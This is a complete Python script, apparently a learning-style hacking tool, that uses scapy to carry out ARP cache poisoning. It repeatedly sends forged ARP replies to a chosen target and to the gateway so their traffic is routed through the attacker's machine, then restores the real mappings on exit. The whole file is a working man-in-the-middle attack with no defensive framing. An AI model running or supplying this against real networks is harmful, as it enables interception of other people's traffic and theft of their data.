#!/use/bin/env python

import scapy.all as scapy
import sys
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip", help="target IP to spoof")
    parser.add_argument("-g", "--getway", dest="getway_ip", help="getway IP to spoof")
    options = parser.parse_args()
    if not options.target_ip:
        parser.error("plaese specify an interface, use -h or --hlp for more info")
    elif not options.getway_ip:
        parser.error("plaese specify an interface, use -h or --hlp for more info")
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #wich IP we will scan
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # the mac address
    arp_request_boradcast = broadcast/arp_request # generate the two functions
    answer_list= scapy.srp(arp_request_boradcast, timeout=1, verbose=False) [0] # sending and receving packets

    return answer_list[0][1].hwsrc



def spoof(target_ip,spoof_ip):
    target_mac = get_mac(target_ip) # returing the mac address of the target
    packet  = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # sending packets to the target ip
    scapy.send(packet, verbose=False)


def restore(des_ip,src_ip):
    des_mac = get_mac(des_ip)  # getting the mac of the destenation ip
    src_mac = get_mac(src_ip) # getting the mac of the source ip
    packet = scapy.ARP(op=2, pdst=des_ip, hwdst=des_mac, psrc=src_ip, hwsrc=src_mac)  # sending packets to the des ip
    scapy.send(packet, verbose=False, count=6)

options = get_arguments()
arp_spoofer_counter = 0
target_ip = options.target_ip
getway_ip = options.getway_ip
try:
    while(True):
        spoof(target_ip, getway_ip)
        spoof(getway_ip, target_ip)
        arp_spoofer_counter = arp_spoofer_counter + 2
        print("\rpacket sent: " + str(arp_spoofer_counter)),
        sys.stdout.flush() # don't stored the buffeer, print in the screen
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Selected CTRL + C..... restting the sources Please Wait.")
    restore(target_ip, getway_ip)
    restore(getway_ip, target_ip)
    print("[+] Done! ")





